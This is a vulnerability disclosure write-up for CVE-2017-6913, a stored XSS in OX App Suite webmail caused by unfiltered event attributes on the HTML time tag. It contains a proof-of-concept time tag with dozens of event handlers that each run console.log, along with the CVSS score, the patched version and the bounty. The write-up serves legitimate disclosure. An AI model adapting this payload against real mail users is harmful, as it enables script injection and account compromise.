CVE-2017-6913
=============

This is a vulnerability I found in open-xchange OX App Suite's webmail (https://www.open-xchange.com/) a while back.


Vulnerability details
---------------------

The webmail was vulnerable to a stored XSS when opening an email, due to the event attributes of the HTML time tag not being properly filtered. Consequently, embedded HTML code such as the one that follows could run JavaScript on an unsuspecting target:

```html
<time onafterprint="console.log('onafterprint')" onbeforeprint="console.log('onbeforeprint')" onbeforeunload="console.log('onbeforeunload')" onerror="console.log('onerror')" onhashchange="console.log('onhashchange')" onload="console.log('onload')" onmessage="console.log('onmessage')" onoffline="console.log('onoffline')" ononline="console.log('ononline')" onpagehide="console.log('onpagehide')" onpageshow="console.log('onpageshow')" onpopstate="console.log('onpopstate')" onresize="console.log('onresize')" onstorage="console.log('onstorage')" onunload="console.log('onunload')" onblur="console.log('onblur')" onchange="console.log('onchange')" oncontextmenu="console.log('oncontextmenu')" onfocus="console.log('onfocus')" oninput="console.log('oninput')" oninvalid="console.log('oninvalid')" onreset="console.log('onreset')" onsearch="console.log('onsearch')" onselect="console.log('onselect')" onsubmit="console.log('onsubmit')" onkeydown="console.log('onkeydown')" onkeypress="console.log('onkeypress')" onkeyup="console.log('onkeyup')" onclick="console.log('onclick')" ondblclick="console.log('ondblclick')" ondrag="console.log('ondrag')" ondragend="console.log('ondragend')" ondragenter="console.log('ondragenter')" ondragleave="console.log('ondragleave')" ondragover="console.log('ondragover')" ondragstart="console.log('ondragstart')" ondrop="console.log('ondrop')" onmousedown="console.log('onmousedown')" onmousemove="console.log('onmousemove')" onmouseout="console.log('onmouseout')" onmouseover="console.log('onmouseover')" onmouseup="console.log('onmouseup')" onmousewheel="console.log('onmousewheel')" onscroll="console.log('onscroll')" onwheel="console.log('onwheel')" oncopy="console.log('oncopy')" oncut="console.log('oncut')" onpaste="console.log('onpaste')" onabort="console.log('onabort')" oncanplay="console.log('oncanplay')" oncanplaythrough="console.log('oncanplaythrough')" oncuechange="console.log('oncuechange')" ondurationchange="console.log('ondurationchange')" onemptied="console.log('onemptied')" onended="console.log('onended')" onloadeddata="console.log('onloadeddata')" onloadedmetadata="console.log('onloadedmetadata')" onloadstart="console.log('onloadstart')" onpause="console.log('onpause')" onplay="console.log('onplay')" onplaying="console.log('onplaying')" onprogress="console.log('onprogress')" onratechange="console.log('onratechange')" onseeked="console.log('onseeked')" onseeking="console.log('onseeking')" onstalled="console.log('onstalled')" onsuspend="console.log('onsuspend')" ontimeupdate="console.log('ontimeupdate')" onvolumechange="console.log('onvolumechange')" onwaiting="console.log('onwaiting')" onshow="console.log('onshow')" ontoggle="console.log('ontoggle')">
Lorem ipsum dolor sit amet ...
</time>
```

An example of the XSS triggering:

![XSS](/console.png "XSS")



Severity
--------

This vulnerability was attributed a CVSS score of 5.3 by the vendor.

CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N


Versions
--------

The vulnerability has been patched from [version 7.6.3-rev28 onwards](https://software.open-xchange.com/products/appsuite/doc/Release_Notes_for_Patch_Release_4133_7.6.3_2017-05-15.pdf).


Bounty
------

The vendor awarded me with a $500 bounty! Many thanks to them.
